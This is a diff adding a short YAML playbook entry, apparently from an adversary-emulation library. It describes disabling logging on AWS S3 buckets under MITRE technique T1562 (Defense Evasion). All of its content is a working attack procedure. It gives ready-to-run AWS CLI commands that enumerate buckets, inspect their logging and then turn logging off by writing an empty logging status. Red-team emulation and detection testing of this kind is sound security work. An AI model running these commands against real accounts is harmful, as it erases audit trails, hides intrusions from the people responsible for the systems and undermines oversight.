@@ -1,0 +1,11 @@
+name: Bypass S3 Bucket Logging
+description: Removes or disables logging on critical S3 buckets to avoid audit trails.
+mitre_technique: T1562
+stage: Defense Evasion
+steps:
+  - action: aws s3api list-buckets --query 'Buckets[*].Name'
+    description: Enumerate all S3 buckets
+  - action: aws s3api get-bucket-logging --bucket <bucket-name>
+    description: Check logging configuration of target bucket
+  - action: aws s3api put-bucket-logging --bucket <bucket-name> --bucket-logging-status '{}'
+    description: Disable logging by updating the logging status with an empty object
